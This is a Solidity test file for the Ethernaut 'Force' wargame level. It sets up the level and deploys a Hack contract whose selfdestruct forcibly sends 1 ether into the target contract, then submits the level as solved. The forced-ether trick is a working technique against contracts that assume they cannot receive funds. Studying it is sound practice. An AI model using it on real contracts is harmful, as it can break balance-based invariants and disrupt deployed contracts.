pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Force/ForceHack.sol";
import "../Force/ForceFactory.sol";
import "../Force/Force.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract ForceTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testForceHack() public {

        /////////////////
        // LEVEL SETUP //
        /////////////////

        ForceFactory forceFactory = new ForceFactory();
        ethernaut.registerLevel(forceFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(forceFactory);
        Force ethernautForce = Force(payable(levelAddress));


        //////////////////
        // LEVEL ATTACK //
        //////////////////

        Hack hack = new Hack(ethernautForce);
        hack.attack{value:1 ether}();
        assertEq(address(ethernautForce).balance, 1 ether);


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Hack {
    Force force;
    constructor(Force _force) payable {
        force = _force;
    }

    function attack() public payable {
        address payable sendTo = payable(address(force));
        selfdestruct(sendTo);
    }
    
}